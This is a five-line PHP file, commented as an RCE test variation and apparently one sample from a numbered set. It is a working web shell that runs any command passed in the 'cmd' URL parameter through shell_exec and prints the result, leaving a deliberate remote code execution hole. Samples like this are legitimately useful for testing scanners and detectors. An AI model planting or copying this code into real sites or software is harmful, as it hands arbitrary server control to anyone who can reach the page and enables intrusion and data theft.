<?php
// RCE test variation #289
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>